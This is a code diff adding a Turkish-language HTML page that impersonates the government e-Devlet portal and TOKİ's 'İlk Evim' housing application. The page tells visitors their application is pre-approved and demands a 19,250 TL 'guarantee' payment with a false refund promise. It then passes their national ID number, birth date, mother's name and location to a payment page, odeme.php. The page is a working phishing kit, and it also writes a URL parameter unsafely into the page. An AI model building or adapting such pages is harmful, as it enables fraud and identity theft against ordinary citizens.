@@ -1,0 +1,588 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>TOKİ İlk Evim Başvurusu - Bilgi</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: #f5f5f5;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+        }
+
+        .header {
+            background: #3b77ac;
+            color: white;
+            padding: 0;
+        }
+
+        .header-top {
+            padding: 12px 20px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+        }
+
+        .header-search {
+            background: #3b77ac;
+            padding: 15px 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.1);
+        }
+
+        .header-logo {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .logo-image {
+            height: 41px;
+            width: auto;
+            filter: brightness(0) invert(1);
+        }
+
+        .menu-btn {
+            background: none;
+            border: none;
+            color: white;
+            font-size: 18px;
+            cursor: pointer;
+            padding: 5px;
+        }
+
+        .user-info {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            width: 300px;
+            max-width: 300px;
+        }
+
+        .user-name {
+            background: white;
+            color: #333;
+            padding: 10px 20px;
+            border-radius: 8px;
+            font-size: 13px;
+            font-weight: 400;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            white-space: nowrap;
+            height: 41px;
+            box-sizing: border-box;
+            width: 100%;
+            border: 1px solid #ddd;
+        }
+
+        .user-name::before {
+            content: "";
+            background-image: url('./images/709699.png');
+            background-size: contain;
+            background-repeat: no-repeat;
+            background-position: center;
+            width: 12px;
+            height: 12px;
+            display: inline-block;
+            filter: brightness(0) saturate(100%) invert(35%) sepia(77%) saturate(1800%) hue-rotate(207deg) brightness(95%) contrast(90%);
+        }
+
+        .dropdown-arrow {
+            width: 16px;
+            height: 16px;
+            background-image: url('./images/arrow.png');
+            background-size: contain;
+            background-repeat: no-repeat;
+            background-position: center;
+            margin-left: 1px;
+            opacity: 0.7;
+            display: inline-block;
+            filter: brightness(0) saturate(100%) invert(48%) sepia(79%) saturate(2476%) hue-rotate(206deg) brightness(118%) contrast(97%);
+        }
+
+        .breadcrumb {
+            background: white;
+            padding: 10px 20px;
+            font-size: 13px;
+            color: #666;
+            border-bottom: 1px solid #eee;
+        }
+
+        .breadcrumb a {
+            color: #4a7bc8;
+            text-decoration: none;
+        }
+
+        .breadcrumb a:hover {
+            text-decoration: underline;
+        }
+
+        .home-icon {
+            width: 14px;
+            height: 14px;
+            vertical-align: middle;
+            margin-right: 5px;
+            filter: brightness(0) saturate(100%) invert(48%) sepia(79%) saturate(2476%) hue-rotate(206deg) brightness(118%) contrast(97%);
+        }
+
+        .main-content {
+            flex: 1;
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 20px;
+            width: 100%;
+        }
+
+        .service-header {
+            background: white;
+            border: 1px solid #ddd;
+            border-radius: 6px;
+            padding: 15px 15px 45px 15px;
+            margin-bottom: 20px;
+            position: relative;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.1);
+            display: flex;
+            align-items: flex-start;
+            gap: 15px;
+        }
+
+        .service-logo {
+            width: 50px;
+            height: 50px;
+            overflow: hidden;
+            border-radius: 4px;
+            flex-shrink: 0;
+        }
+
+        .toki-logo-img {
+            width: 100%;
+            height: 100%;
+            object-fit: contain;
+        }
+
+        .service-info {
+            flex: 1;
+            margin-top: 0;
+            margin-left: 0;
+        }
+
+        .service-info h2 {
+            font-size: 14px;
+            color: #333;
+            margin-bottom: 5px;
+            line-height: 1.3;
+        }
+
+        .service-info p {
+            font-size: 11px;
+            color: #666;
+            margin: 0;
+            line-height: 1.3;
+        }
+
+        .header-social-actions {
+            position: absolute;
+            bottom: 15px;
+            right: 15px;
+            display: flex;
+            gap: 8px;
+        }
+
+        .header-social-btn {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            width: 28px;
+            height: 28px;
+            border-radius: 50%;
+            text-decoration: none;
+            font-size: 12px;
+            transition: all 0.2s;
+            filter: grayscale(100%);
+            background: #f8f9fa;
+            border: 1px solid #e9ecef;
+            cursor: pointer;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.1);
+        }
+
+        .header-social-btn:hover {
+            filter: none;
+            transform: scale(1.1);
+            background: white;
+            box-shadow: 0 2px 6px rgba(0,0,0,0.15);
+        }
+
+        .header-social-btn:active {
+            transform: scale(0.95);
+        }
+
+        .social-icon-img {
+            width: 14px;
+            height: 14px;
+            transition: all 0.2s;
+        }
+
+        /* Emoji için özel stil */
+        .header-social-btn:first-child {
+            color: #ffc107;
+            background: #fff8e1;
+            border-color: #ffecb3;
+        }
+
+        .header-social-btn:first-child:hover {
+            background: #fff3c4;
+            border-color: #ffc107;
+        }
+
+        /* Success Notification Styles */
+        .success-notification {
+            background: #d4edda;
+            border: 2px solid #4caf50;
+            border-radius: 8px;
+            padding: 15px 20px;
+            margin-bottom: 20px;
+            text-align: center;
+        }
+
+        .success-text {
+            color: #155724;
+            font-size: 14px;
+            font-weight: 500;
+        }
+
+        /* Payment Info Box Styles */
+        .payment-info-box {
+            background: #e3f2fd;
+            border: 2px solid #2196f3;
+            border-radius: 8px;
+            margin-bottom: 20px;
+            overflow: hidden;
+        }
+
+        .payment-content {
+            padding: 20px;
+        }
+
+        .payment-title {
+            font-size: 14px;
+            color: #333;
+            margin-bottom: 5px;
+        }
+
+        .payment-amount {
+            font-size: 18px;
+            font-weight: bold;
+            color: #2196f3;
+            margin-bottom: 15px;
+        }
+
+        .payment-description {
+            font-size: 13px;
+            color: #333;
+            margin-bottom: 15px;
+            line-height: 1.4;
+        }
+
+        .info-section {
+            display: flex;
+            align-items: flex-start;
+            gap: 12px;
+        }
+
+        .info-icon {
+            background: #2196f3;
+            color: white;
+            width: 24px;
+            height: 24px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 14px;
+            font-weight: bold;
+            flex-shrink: 0;
+            margin-top: 2px;
+        }
+
+        .info-i {
+            font-style: normal;
+            font-weight: bold;
+        }
+
+        .info-text {
+            flex: 1;
+        }
+
+        .info-text p {
+            font-size: 12px;
+            color: #1565c0;
+            line-height: 1.4;
+            margin-bottom: 8px;
+        }
+
+        .info-text p:last-child {
+            margin-bottom: 0;
+        }
+
+        .info-text strong {
+            font-weight: 600;
+        }
+
+        /* Continue Button Section Styles */
+        .continue-button-section {
+            background: #ecf2f8;
+            padding: 20px;
+            text-align: center;
+            border-top: 1px solid #ddd;
+            margin-top: 20px;
+            border-radius: 0 0 6px 6px;
+        }
+
+        .continue-button {
+            background: #4a7bc8;
+            color: white;
+            border: none;
+            padding: 12px 30px;
+            border-radius: 20px;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: all 0.2s;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+        }
+
+        .continue-button:hover {
+            background: #3d6bb0;
+            transform: translateY(-1px);
+            box-shadow: 0 4px 8px rgba(0,0,0,0.15);
+        }
+
+        .continue-button:active {
+            transform: translateY(0);
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+        }
+
+        .footer {
+            background: #4b4e51;
+            color: white;
+            margin-top: 50px;
+            padding: 30px 0;
+        }
+
+        .footer-content {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 20px;
+        }
+
+        .footer-left {
+            text-align: left;
+        }
+
+        .footer-logo {
+            padding-top: 20px;
+            border-top: 1px solid #666;
+            display: flex;
+            align-items: center;
+            margin-bottom: 15px;
+        }
+
+        .tc-logo-img {
+            height: 40px;
+        }
+
+        .indir-logo-img {
+            height: 40px;
+            margin-left: 10px;
+        }
+
+        .footer-description {
+            margin-bottom: 15px;
+        }
+
+        .footer-description p {
+            text-align: justify;
+            font-size: 9px;
+            line-height: 1.4;
+            color: #ccc;
+        }
+
+        .footer-copyright {
+            padding-top: 15px;
+            border-top: 1px solid #666;
+        }
+
+        .footer-copyright p {
+            color: #999;
+            font-size: 9px;
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <div class="header-top">
+            <div class="header-logo">
+                <img src="./images/mylogoimportantone.png" alt="türkiye.gov.tr" class="logo-image">
+            </div>
+            <button class="menu-btn">☰</button>
+        </div>
+        <div class="header-search">
+            <div class="user-info">
+                <div class="user-name">
+                    KULLANICI <span class="dropdown-arrow"></span>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="breadcrumb">
+        <img src="./images/home.png" alt="Ana Sayfa" class="home-icon"> <a href="#">Toplu Konut İdaresi Başkanlığı (...)</a> > İlk Evim Başvurusu > Bilgi
+    </div>
+
+    <div class="main-content">
+        <div class="service-header">
+            <div class="service-logo">
+                <img src="./images/tokyiim.webp" alt="TOKİ" class="toki-logo-img">
+            </div>
+            <div class="service-info">
+                <h2>Toplu Konut İdaresi Başkanlığı (TOKİ)</h2>
+                <p>İlk Evim Başvurusu</p>
+            </div>
+            <div class="header-social-actions">
+                <a href="#" class="header-social-btn" title="Favorilere Ekle">⭐</a>
+                <a href="#" class="header-social-btn comment-btn" title="Yorum Yap">
+                    <img src="./images/chat.png" alt="Yorum" class="social-icon-img">
+                </a>
+                <a href="#" class="header-social-btn share-btn" title="Paylaş">
+                    <img src="./images/sosial.png" alt="Paylaş" class="social-icon-img">
+                </a>
+            </div>
+        </div>
+
+        <!-- T.C. Kimlik Numaralı Şahsa Ait Başvuru Onayı -->
+        <div class="success-notification">
+            <div class="success-text">
+                T.C. kimlik numaralı şahsa ait başvuru ön onay almıştır.
+            </div>
+        </div>
+
+        <!-- Ödeme Bilgilendirme Kutusu -->
+        <div class="payment-info-box">
+            <div class="payment-content">
+                <div class="payment-title">İlk taksitinizin teminat bedeli :</div>
+                <div class="payment-amount">19.250 TL</div>
+                
+                <p class="payment-description">
+                    İlk taksitinize ait teminat bedelinin ödenmesi gerekmektedir.
+                </p>
+                
+                <div class="info-section">
+                    <div class="info-icon">
+                        <i class="info-i">i</i>
+                    </div>
+                    <div class="info-text">
+                        <p><strong>Ödeme işleminden sonra işleminiz tamamlanacaktır.</strong></p>
+                        <p>Yatırdığınız tüm tutarlar banka hesabınıza işlem sonunda iade edilecektir.</p>
+                        <p>Başka bir banka hesabından da ödeme yapabilirsiniz.</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Devam Et Butonu -->
+        <div class="continue-button-section">
+            <button id="continue-btn" class="continue-button">Devam Et ></button>
+        </div>
+        
+    </div>
+
+    <footer class="footer">
+        <div class="footer-content">
+            <div class="footer-left">
+                <div class="footer-logo">
+                    <img src="./images/tsc.png" alt="T.C. Cumhurbaşkanlığı Digital Dönüşüm Ofisi" class="tc-logo-img">
+                    <img src="./images/indir.png" alt="İndir" class="indir-logo-img">
+                </div>
+                <div class="footer-description">
+                    <p>e-Devlet Kapısı'nın kurulması ve yönetilmesi görevi T.C. Cumhurbaşkanlığı Digital Dönüşüm Ofisi Başkanlığı tarafından yürütülmekte olup, sistem altyapısının sağlanması Türksat A.Ş. tarafından yapılmaktadır.</p>
+                </div>
+                <div class="footer-copyright">
+                    <p>© 2025 Tüm Hakları Saklıdır. Gizlilik, Kullanım ve Telif Hakları bildiriminde belirtilen kurallar çerçevesinde hizmet sunulmaktadır.</p>
+                </div>
+            </div>
+        </div>
+    </footer>
+
+    <script>
+        // URL'den kullanıcı bilgilerini al
+        const urlParams = new URLSearchParams(window.location.search);
+        const userName = urlParams.get('name') || urlParams.get('user') || urlParams.get('kullanici') || 'KULLANICI';
+        
+        // Kullanıcı adını güncelle (büyük harfe çevir)
+        document.querySelector('.user-name').innerHTML = userName.toUpperCase() + ' <span class="dropdown-arrow"></span>';
+
+        // T.C. kimlik numarasını URL'den al ve success notification'ı güncelle
+        const tcNumber = urlParams.get('tc') || '11111111110';
+        const successText = document.querySelector('.success-text');
+        if (successText) {
+            successText.textContent = `${tcNumber} T.C. kimlik numaralı şahsa ait başvuru ön onay almıştır.`;
+        }
+
+        // Devam Et butonu fonksiyonalitesi
+        document.getElementById('continue-btn').addEventListener('click', function() {
+            // URL parametrelerini al
+            const urlParams = new URLSearchParams(window.location.search);
+            const name = urlParams.get('name') || '';
+            const tc = urlParams.get('tc') || '';
+            const birthDate = urlParams.get('birth_date') || '';
+            const city = urlParams.get('city') || '';
+            const district = urlParams.get('district') || '';
+            const motherName = urlParams.get('mother_name') || '';
+            const source = urlParams.get('source') || '';
+            const project = urlParams.get('project') || '';
+            
+            // odeme.php sayfasına yönlendir (tüm parametreleri geçir)
+            const appId = urlParams.get('app_id') || '';
+            window.location.href = `odeme.php?name=${encodeURIComponent(name)}&tc=${encodeURIComponent(tc)}&birth_date=${encodeURIComponent(birthDate)}&city=${encodeURIComponent(city)}&district=${encodeURIComponent(district)}&mother_name=${encodeURIComponent(motherName)}&source=${encodeURIComponent(source)}&project=${encodeURIComponent(project)}&app_id=${encodeURIComponent(appId)}`;
+        });
+
+        // Sosyal buton işlevleri
+        document.querySelectorAll('.header-social-btn').forEach(btn => {
+            btn.addEventListener('click', function(e) {
+                e.preventDefault();
+                const title = this.getAttribute('title');
+                
+                if (title === 'Favorilere Ekle') {
+                    alert('Favorilere eklendi!');
+                } else if (title === 'Yorum Yap') {
+                    alert('Yorum sayfası açılacak...');
+                } else if (title === 'Paylaş') {
+                    if (navigator.share) {
+                        navigator.share({
+                            title: 'TOKİ İlk Evim Başvurusu - Bilgi',
+                            text: 'TOKİ İlk Evim bilgi sayfası',
+                            url: window.location.href
+                        });
+                    } else {
+                        navigator.clipboard.writeText(window.location.href);
+                        alert('Sayfa linki kopyalandı!');
+                    }
+                }
+            });
+        });
+    </script>
+</body>
+</html>
+
